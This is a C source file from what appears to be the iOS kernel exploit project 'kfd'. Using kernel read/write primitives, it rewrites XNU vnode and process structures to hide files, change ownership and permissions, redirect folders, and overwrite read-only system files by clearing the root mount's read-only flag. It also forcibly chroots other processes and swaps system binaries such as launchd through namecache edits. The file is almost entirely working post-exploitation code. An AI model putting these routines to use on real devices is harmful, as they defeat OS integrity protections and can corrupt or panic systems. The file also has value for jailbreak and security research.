//
//  vnode.c
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/07/29.
//

#include "vnode.h"
#include "krw.h"
#include "proc.h"
#include "offsets.h"
#include "common.h"
#include <sys/fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <sys/mman.h>
#include <Foundation/Foundation.h>
#include "thanks_opa334dev_htrowii.h"
#include "utils.h"

uint64_t getVnodeAtPath(char* filename) {
    int file_index = open(filename, O_RDONLY);
    if (file_index == -1) return -1;
    
    uint64_t proc = getProc(getpid());

    uint64_t filedesc_pac = kread64(proc + off_p_pfd);
    uint64_t filedesc = filedesc_pac | base_pac_mask;
    uint64_t openedfile = kread64(filedesc + (8 * file_index));
    uint64_t fileglob_pac = kread64(openedfile + off_fp_glob);
    uint64_t fileglob = fileglob_pac | base_pac_mask;
    uint64_t vnode_pac = kread64(fileglob + off_fg_data);
    uint64_t vnode = vnode_pac | base_pac_mask;
    
    close(file_index);
    
    return vnode;
}

uint64_t funVnodeHide(char* filename) {
    uint64_t vnode = getVnodeAtPath(filename);
    if(vnode == -1) {
        NSLog(@"[-] Unable to get vnode, path: %s", filename);
        return -1;
    }
    
    //vnode_ref, vnode_get
    uint32_t usecount = kread32(vnode + off_vnode_v_usecount);
    uint32_t iocount = kread32(vnode + off_vnode_v_iocount);
    NSLog(@"[i] vnode->usecount: %d, vnode->iocount: %d", usecount, iocount);
    kwrite32(vnode + off_vnode_v_usecount, usecount + 1);
    kwrite32(vnode + off_vnode_v_iocount, iocount + 1);
    
    //hide file
    uint32_t v_flags = kread32(vnode + off_vnode_v_flag);
    NSLog(@"[i] vnode->v_flags: 0x%x", v_flags);
    kwrite32(vnode + off_vnode_v_flag, (v_flags | VISSHADOW));

    //exist test (should not be exist
    NSLog(@"[i] %s access ret: %d", filename, access(filename, F_OK));
    
    //restore vnode iocount, usecount
    usecount = kread32(vnode + off_vnode_v_usecount);
    iocount = kread32(vnode + off_vnode_v_iocount);
    if(usecount > 0)
        kwrite32(vnode + off_vnode_v_usecount, usecount - 1);
    if(iocount > 0)
        kwrite32(vnode + off_vnode_v_iocount, iocount - 1);

    return vnode;
}

uint64_t funVnodeReveal(uint64_t vnode) {
    //vnode_ref, vnode_get
    uint32_t usecount = kread32(vnode + off_vnode_v_usecount);
    uint32_t iocount = kread32(vnode + off_vnode_v_iocount);
    NSLog(@"[i] vnode->usecount: %d, vnode->iocount: %d", usecount, iocount);
    kwrite32(vnode + off_vnode_v_usecount, usecount + 1);
    kwrite32(vnode + off_vnode_v_iocount, iocount + 1);
    
    //show file
    uint32_t v_flags = kread32(vnode + off_vnode_v_flag);
    kwrite32(vnode + off_vnode_v_flag, (v_flags &= ~VISSHADOW));
    
    //restore vnode iocount, usecount
    usecount = kread32(vnode + off_vnode_v_usecount);
    iocount = kread32(vnode + off_vnode_v_iocount);
    if(usecount > 0)
        kwrite32(vnode + off_vnode_v_usecount, usecount - 1);
    if(iocount > 0)
        kwrite32(vnode + off_vnode_v_iocount, iocount - 1);

    return 0;
}

uint64_t funVnodeChown(char* filename, uid_t uid, gid_t gid) {

    uint64_t vnode = getVnodeAtPath(filename);
    if(vnode == -1) {
        NSLog(@"[-] Unable to get vnode, path: %s", filename);
        return -1;
    }
    
    uint64_t v_data = kread64(vnode + off_vnode_v_data);
    uint32_t v_uid = kread32(v_data + 0x80);
    uint32_t v_gid = kread32(v_data + 0x84);
    
    //vnode->v_data->uid
    NSLog(@"[i] Patching %s vnode->v_uid %d -> %d", filename, v_uid, uid);
    kwrite32(v_data+0x80, uid);
    //vnode->v_data->gid
    NSLog(@"[i] Patching %s vnode->v_gid %d -> %d", filename, v_gid, gid);
    kwrite32(v_data+0x84, gid);
    
    struct stat file_stat;
    if(stat(filename, &file_stat) == 0) {
        NSLog(@"[+] %s UID: %d", filename, file_stat.st_uid);
        NSLog(@"[+] %s GID: %d", filename, file_stat.st_gid);
    }
    
    return 0;
}

uint64_t funVnodeChmod(char* filename, mode_t mode) {
    uint64_t vnode = getVnodeAtPath(filename);
    if(vnode == -1) {
        NSLog(@"[-] Unable to get vnode, path: %s", filename);
        return -1;
    }
    
    uint64_t v_data = kread64(vnode + off_vnode_v_data);
    uint32_t v_mode = kread32(v_data + 0x88);
    
    NSLog(@"[i] Patching %s vnode->v_mode %o -> %o", filename, v_mode, mode);
    kwrite32(v_data+0x88, mode);
    
    struct stat file_stat;
    if(stat(filename, &file_stat) == 0) {
        NSLog(@"[+] %s mode: %o", filename, file_stat.st_mode);
    }
    
    return 0;
}

uint64_t findRootVnode(void) {
    uint64_t launchd_proc = getProc(1);
    
    uint64_t textvp_pac = kread64(launchd_proc + off_p_textvp);
    uint64_t textvp = textvp_pac | base_pac_mask;
    NSLog(@"[i] launchd proc->textvp: 0x%llx\n", textvp);

    uint64_t textvp_nameptr = kread64(textvp + off_vnode_v_name);
    uint64_t textvp_name = kread64(textvp_nameptr);
    uint64_t devvp = kread64((kread64(textvp + off_vnode_v_mount) | base_pac_mask) + off_mount_mnt_devvp);
    uint64_t nameptr = kread64(devvp + off_vnode_v_name);
    uint64_t name = kread64(nameptr);
    char* devName = &name;
    NSLog(@"[i] launchd proc->textvp->v_name: %s, v_mount->mnt_devvp->v_name: %s", (char*)&textvp_name, devName);
    
    uint64_t sbin_vnode = kread64(textvp + off_vnode_v_parent) | base_pac_mask;
    textvp_nameptr = kread64(sbin_vnode + off_vnode_v_name);
    textvp_name = kread64(textvp_nameptr);
    devvp = kread64((kread64(textvp + off_vnode_v_mount) | base_pac_mask) + off_mount_mnt_devvp);
    nameptr = kread64(devvp + off_vnode_v_name);
    name = kread64(nameptr);
    devName = &name;
    NSLog(@"[i] launchd proc->textvp->v_parent->v_name: %s, v_mount->mnt_devvp->v_name:%s", (char*)&textvp_name, devName);
    
    uint64_t root_vnode = kread64(sbin_vnode + off_vnode_v_parent) | base_pac_mask;
    textvp_nameptr = kread64(root_vnode + off_vnode_v_name);
    textvp_name = kread64(textvp_nameptr);
    devvp = kread64((kread64(root_vnode + off_vnode_v_mount) | base_pac_mask) + off_mount_mnt_devvp);
    nameptr = kread64(devvp + off_vnode_v_name);
    name = kread64(nameptr);
    devName = &name;
    NSLog(@"[i] launchd proc->textvp->v_parent->v_parent->v_name: %s, v_mount->mnt_devvp->v_name:%s", (char*)&textvp_name, devName);
    NSLog(@"[+] rootvnode: 0x%llx", root_vnode);
    
    return root_vnode;
}

uint64_t funVnodeRedirectFolder(char* to, char* from) {
    uint64_t to_vnode = getVnodeAtPath(to);
    if(to_vnode == -1) {
        NSLog(@"[-] Unable to get vnode, path: %s\n", to);
        return -1;
    }
    
    uint8_t to_v_references = kread8(to_vnode + off_vnode_v_references);
    uint32_t to_usecount = kread32(to_vnode + off_vnode_v_usecount);
    uint32_t to_v_kusecount = kread32(to_vnode + off_vnode_v_kusecount);
    uint64_t orig_to_v_data = kread64(to_vnode + off_vnode_v_data);
    
    uint64_t from_vnode = getVnodeAtPath(from);
    if(from_vnode == -1) {
        NSLog(@"[-] Unable to get vnode, path: %s", from);
        return -1;
    }
    
    //If mount point is different, return -1
    uint64_t to_devvp = kread64((kread64(to_vnode + off_vnode_v_mount) | base_pac_mask) + off_mount_mnt_devvp);
    uint64_t from_devvp = kread64((kread64(from_vnode + off_vnode_v_mount) | base_pac_mask) + off_mount_mnt_devvp);
    if(to_devvp != from_devvp) {
        NSLog(@"[-] mount points of folders are different!");
        return -1;
    }
    
    uint64_t from_v_data = kread64(from_vnode + off_vnode_v_data);
    
    kwrite32(to_vnode + off_vnode_v_usecount, to_usecount + 1);
    kwrite32(to_vnode + off_vnode_v_kusecount, to_v_kusecount + 1);
    kwrite8(to_vnode + off_vnode_v_references, to_v_references + 1);
    kwrite64(to_vnode + off_vnode_v_data, from_v_data);
    
    return orig_to_v_data;
}

uint64_t funVnodeOverwriteFile(char* to, char* from) {

    int to_file_index = open(to, O_RDONLY);
    if (to_file_index == -1) return -1;
    off_t to_file_size = lseek(to_file_index, 0, SEEK_END);
    
    int from_file_index = open(from, O_RDONLY);
    if (from_file_index == -1) return -1;
    off_t from_file_size = lseek(from_file_index, 0, SEEK_END);
    
    if(to_file_size < from_file_size) {
        close(from_file_index);
        close(to_file_index);
        NSLog(@"[-] File is too big to overwrite!");
        return -1;
    }
    
    uint64_t proc = getProc(getpid());
    
    //get vnode
    uint64_t filedesc_pac = kread64(proc + off_p_pfd);
    uint64_t filedesc = filedesc_pac | base_pac_mask;
    uint64_t openedfile = kread64(filedesc + (8 * to_file_index));
    uint64_t fileglob_pac = kread64(openedfile + off_fp_glob);
    uint64_t fileglob = fileglob_pac | base_pac_mask;
    uint64_t vnode_pac = kread64(fileglob + off_fg_data);
    uint64_t to_vnode = vnode_pac | base_pac_mask;
    NSLog(@"[i] %s to_vnode: 0x%llx", to, to_vnode);
    
    uint64_t rootvnode_mount_pac = kread64(findRootVnode() + off_vnode_v_mount);
    uint64_t rootvnode_mount = rootvnode_mount_pac | base_pac_mask;
    uint32_t rootvnode_mnt_flag = kread32(rootvnode_mount + off_mount_mnt_flag);
    
    kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag & ~MNT_RDONLY);
    kwrite32(fileglob + off_fg_flag, FREAD | FWRITE);
    
    uint32_t to_vnode_v_writecount =  kread32(to_vnode + off_vnode_v_writecount);
    NSLog(@"[i] %s Increasing to_vnode->v_writecount: %d", to, to_vnode_v_writecount);
    if(to_vnode_v_writecount <= 0) {
        kwrite32(to_vnode + off_vnode_v_writecount, to_vnode_v_writecount + 1);
        NSLog(@"[+] %s Increased to_vnode->v_writecount: %d", to, kread32(to_vnode + off_vnode_v_writecount));
    }
    

    char* from_mapped = mmap(NULL, from_file_size, PROT_READ, MAP_PRIVATE, from_file_index, 0);
    if (from_mapped == MAP_FAILED) {
        perror("[-] Failed mmap (from_mapped)");
        kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag);
        close(from_file_index);
        close(to_file_index);
        return -1;
    }
    
    char* to_mapped = mmap(NULL, to_file_size, PROT_READ | PROT_WRITE, MAP_SHARED, to_file_index, 0);
    if (to_mapped == MAP_FAILED) {
        perror("[-] Failed mmap (to_mapped)");
        kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag);
        close(from_file_index);
        close(to_file_index);
        return -1;
    }
    
    memcpy(to_mapped, from_mapped, from_file_size);
    NSLog(@"[i] msync ret: %d", msync(to_mapped, to_file_size, MS_SYNC));
    
    munmap(from_mapped, from_file_size);
    munmap(to_mapped, to_file_size);
    
    kwrite32(fileglob + off_fg_flag, FREAD);
    kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag);
    
    close(from_file_index);
    close(to_file_index);
    
    return 0;
}

uint64_t funVnodeIterateByPath(char* dirname) {
    
    uint64_t vnode = getVnodeAtPath(dirname);
    if(vnode == -1) {
        NSLog(@"[-] Unable to get vnode, path: %s", dirname);
        return -1;
    }
    
    uint64_t vp_nameptr = kread64(vnode + off_vnode_v_name);
    uint64_t vp_name = kread64(vp_nameptr);
    
    NSLog(@"[i] vnode->v_name: %s", (char*)&vp_name);
    
    //get child directory
    
    uint64_t vp_namecache = kread64(vnode + off_vnode_v_ncchildren_tqh_first);
    NSLog(@"[i] vnode->v_ncchildren.tqh_first: 0x%llx", vp_namecache);
    if(vp_namecache == 0)
        return 0;
    
    while(1) {
        if(vp_namecache == 0)
            break;
        vnode = kread64(vp_namecache + off_namecache_nc_vp);
        if(vnode == 0)
            break;
        vp_nameptr = kread64(vnode + off_vnode_v_name);
        
        char vp_name[256];
        kreadbuf(vp_nameptr, &vp_name, 256);
        
        NSLog(@"[i] vnode->v_name: %s, vnode: 0x%llx", vp_name, vnode);
        vp_namecache = kread64(vp_namecache + off_namecache_nc_child_tqe_prev);
    }

    return 0;
}

uint64_t funVnodeIterateByVnode(uint64_t vnode) {
    uint64_t vp_nameptr = kread64(vnode + off_vnode_v_name);
    uint64_t vp_name = kread64(vp_nameptr);
    
    NSLog(@"[i] vnode->v_name: %s", (char*)&vp_name);
    
    //get child directory
    uint64_t vp_namecache = kread64(vnode + off_vnode_v_ncchildren_tqh_first);
    NSLog(@"[i] vnode->v_ncchildren.tqh_first: 0x%llx", vp_namecache);
    if(vp_namecache == 0)
        return 0;
    
    while(1) {
        if(vp_namecache == 0)
            break;
        vnode = kread64(vp_namecache + off_namecache_nc_vp);
        if(vnode == 0)
            break;
        vp_nameptr = kread64(vnode + off_vnode_v_name);
        
        char vp_name[256];
        kreadbuf(vp_nameptr, &vp_name, 256);
        
        NSLog(@"[i] vnode->v_name: %s, vnode: 0x%llx", vp_name, vnode);
        vp_namecache = kread64(vp_namecache + off_namecache_nc_child_tqe_prev);
    }

    return 0;
}

uint64_t getVnodeVar(void) {
    return getVnodeAtPathByChdir("/private/var");
}

uint64_t getVnodeVarMobile(void) {
    return getVnodeAtPathByChdir("/private/var/mobile");
}

uint64_t getVnodePreferences(void) {
    return getVnodeAtPathByChdir("/private/var/mobile/Library/Preferences");
}

uint64_t getVnodeLibrary(void) {
    return getVnodeAtPathByChdir("/private/var/mobile/Library");;
}

uint64_t getVnodeSystemGroup(void) {
    return getVnodeAtPathByChdir("/private/var/containers/Shared/SystemGroup");
}

uint64_t findChildVnodeByVnode(uint64_t vnode, char* childname) {
    uint64_t vp_nameptr = kread64(vnode + off_vnode_v_name);
    uint64_t vp_name = kread64(vp_nameptr);

    uint64_t vp_namecache = kread64(vnode + off_vnode_v_ncchildren_tqh_first);
    
    if(vp_namecache == 0)
        return 0;
    
    while(1) {
        if(vp_namecache == 0)
            break;
        vnode = kread64(vp_namecache + off_namecache_nc_vp);
        if(vnode == 0)
            break;
        vp_nameptr = kread64(vnode + off_vnode_v_name);
        
        char vp_name[256];
        kreadbuf(vp_nameptr, &vp_name, 256);
//        NSLog(@"vp_name: %s\n", vp_name);
        
        if(strcmp(vp_name, childname) == 0) {
            return vnode;
        }
        vp_namecache = kread64(vp_namecache + off_namecache_nc_child_tqe_prev);
    }

    return 0;
}

uint64_t funVnodeRedirectFolderFromVnode(char* to, uint64_t from_vnode) {
    uint64_t to_vnode = getVnodeAtPath(to);
    if(to_vnode == -1) {
        NSLog(@"[-] Unable to get vnode, path: %s", to);
        return -1;
    }
    
    uint8_t to_v_references = kread8(to_vnode + off_vnode_v_references);
    uint32_t to_usecount = kread32(to_vnode + off_vnode_v_usecount);
    uint32_t to_v_kusecount = kread32(to_vnode + off_vnode_v_kusecount);
    uint64_t orig_to_v_data = kread64(to_vnode + off_vnode_v_data);
    
    //If mount point is different, return -1
    uint64_t to_devvp = kread64((kread64(to_vnode + off_vnode_v_mount) | base_pac_mask) + off_mount_mnt_devvp);
    uint64_t from_devvp = kread64((kread64(from_vnode + off_vnode_v_mount) | base_pac_mask) + off_mount_mnt_devvp);
    if(to_devvp != from_devvp) {
        NSLog(@"[-] mount points of folders are different!");
        return -1;
    }
    
    uint64_t from_v_data = kread64(from_vnode + off_vnode_v_data);
    
    kwrite32(to_vnode + off_vnode_v_usecount, to_usecount + 1);
    kwrite32(to_vnode + off_vnode_v_kusecount, to_v_kusecount + 1);
    kwrite8(to_vnode + off_vnode_v_references, to_v_references + 1);
    kwrite64(to_vnode + off_vnode_v_data, from_v_data);
    
    return orig_to_v_data;
}

uint64_t funVnodeUnRedirectFolder (char* to, uint64_t orig_to_v_data) {
    uint64_t to_vnode = getVnodeAtPath(to);
    if(to_vnode == -1) {
        NSLog(@"[-] Unable to get vnode, path: %s", to);
        return -1;
    }
    
    uint8_t to_v_references = kread8(to_vnode + off_vnode_v_references);
    uint32_t to_usecount = kread32(to_vnode + off_vnode_v_usecount);
    uint32_t to_v_kusecount = kread32(to_vnode + off_vnode_v_kusecount);
    
    kwrite64(to_vnode + off_vnode_v_data, orig_to_v_data);
    
    if(to_usecount > 0)
       kwrite32(to_vnode + off_vnode_v_usecount, to_usecount - 1);
    if(to_v_kusecount > 0)
        kwrite32(to_vnode + off_vnode_v_kusecount, to_v_kusecount - 1);
    if(to_v_references > 0)
        kwrite8(to_vnode + off_vnode_v_references, to_v_references - 1);
    
    return 0;
}

uint64_t funVnodeOverwriteFileUnlimitSize(char* to, char* from) {

    int to_file_index = open(to, O_RDONLY);
    if (to_file_index == -1) return -1;
    
    int from_file_index = open(from, O_RDONLY);
    if (from_file_index == -1) return -1;
    off_t from_file_size = lseek(from_file_index, 0, SEEK_END);
    
    uint64_t proc = getProc(getpid());
    
    //get vnode
    uint64_t filedesc_pac = kread64(proc + off_p_pfd);
    uint64_t filedesc = filedesc_pac | base_pac_mask;
    uint64_t openedfile = kread64(filedesc + (8 * to_file_index));
    uint64_t fileglob_pac = kread64(openedfile + off_fp_glob);
    uint64_t fileglob = fileglob_pac | base_pac_mask;
    uint64_t vnode_pac = kread64(fileglob + off_fg_data);
    uint64_t to_vnode = vnode_pac | base_pac_mask;
    NSLog(@"[i] %s to_vnode: 0x%llx", to, to_vnode);
    
    kwrite32(fileglob + off_fg_flag, FREAD | FWRITE);
    
    uint32_t to_vnode_v_writecount =  kread32(to_vnode + off_vnode_v_writecount);
    NSLog(@"[i] %s Increasing to_vnode->v_writecount: %d", to, to_vnode_v_writecount);
    if(to_vnode_v_writecount <= 0) {
        kwrite32(to_vnode + off_vnode_v_writecount, to_vnode_v_writecount + 1);
        NSLog(@"[+] %s Increased to_vnode->v_writecount: %d", to, kread32(to_vnode + off_vnode_v_writecount));
    }
    

    char* from_mapped = mmap(NULL, from_file_size, PROT_READ, MAP_PRIVATE, from_file_index, 0);
    if (from_mapped == MAP_FAILED) {
        perror("[-] Failed mmap (from_mapped)");
        close(from_file_index);
        close(to_file_index);
        return -1;
    }
    
    NSLog(@"[i] ftruncate ret: %d", ftruncate(to_file_index, 0));
    NSLog(@"[i] write ret: %zd", write(to_file_index, from_mapped, from_file_size));
    
    munmap(from_mapped, from_file_size);
    
    kwrite32(fileglob + off_fg_flag, FREAD);
    
    close(from_file_index);
    close(to_file_index);

    return 0;
}

uint64_t getVnodeAtPathByChdir(char *path) {
    NSLog(@"get vnode of %s", path);
    if(access(path, F_OK) == -1) {
        NSLog(@"accessing not OK");
        return -1;
    }
    if(chdir(path) == -1) {
        NSLog(@"chdir not OK");
        return -1;
    }
    uint64_t fd_cdir_vp = kread64(getProc(getpid()) + off_p_pfd + off_fd_cdir);
    chdir("/");
    return fd_cdir_vp;
}

void ChangeDirFor(int pid, const char *where)
{
    NSLog(@"change dir for pid %d", pid);
    uint64_t proc = getProc(pid);
    uint64_t vp = getVnodeAtPathByChdir(where);
    if (vp == -1) {
        vp = getVnodeAtPath(where);
    }
    NSLog(@"vp %llx\n", vp);
    kwrite64(proc + off_p_pfd + (off_fd_cdir + 0x8), vp); // rdir
    kwrite64(proc + off_p_pfd + (off_fd_cdir + 0x0), vp); // cdir
    uint32_t fd_flags = kread32(proc + off_p_pfd + 0x58); // flag
    fd_flags |= 1; // FD_CHROOT = 1;
    kwrite32(proc + off_p_pfd + 0x58, fd_flags);
    usleep(250);
    fd_flags &= ~1; // FD_CHROOT = 1;
    kwrite32(proc + off_p_pfd + 0x58, fd_flags);
    kwrite32(vp + off_vnode_v_usecount, 0x2000); // the usecount will be -1 after this and panic after a userspace reboot
    kwrite32(vp + off_vnode_v_iocount, 0x2000);
}

// try reading through vp_ncchildren of /sbin/'s vnode to find launchd's namecache
// after that, kwrite namecache, vnode id -> thx bedtime / misfortune

int SwitchSysBin(uint64_t vnode, char* what, char* with)
{
    uint64_t vp_nameptr = kread64(vnode + off_vnode_v_name);
    uint64_t vp_namecache = kread64(vnode + off_vnode_v_ncchildren_tqh_first);
    if(vp_namecache == 0)
        return 0;
    
    while(1) {
        if(vp_namecache == 0)
            break;
        vnode = kread64(vp_namecache + off_namecache_nc_vp);
        if(vnode == 0)
            break;
        vp_nameptr = kread64(vnode + off_vnode_v_name);
        
        char vp_name[256];
        kreadbuf(kread64(vp_namecache + 96), &vp_name, 256);
        NSLog(@"vp_name: %s\n", vp_name);
        
        if(strcmp(vp_name, what) == 0)
        {
            uint64_t with_vnd = getVnodeAtPath(with);
            uint32_t with_vnd_id = kread64(with_vnd + 116);
            uint64_t patient = kread64(vp_namecache + 80);        // vnode the name refers
            uint32_t patient_vid = kread64(vp_namecache + 64);    // name vnode id
            NSLog(@"patient: %llx vid:%llx -> %llx\n", patient, patient_vid, with_vnd_id);

            kwrite64(vp_namecache + 80, with_vnd);
            kwrite32(vp_namecache + 64, with_vnd_id);
            
            return vnode;
        }
        vp_namecache = kread64(vp_namecache + off_namecache_nc_child_tqe_prev);
    }
    kwrite32(vnode + off_vnode_v_usecount, 0x2000); // idk...
    kwrite32(vnode + off_vnode_v_iocount, 0x2000);
    return 0;
}
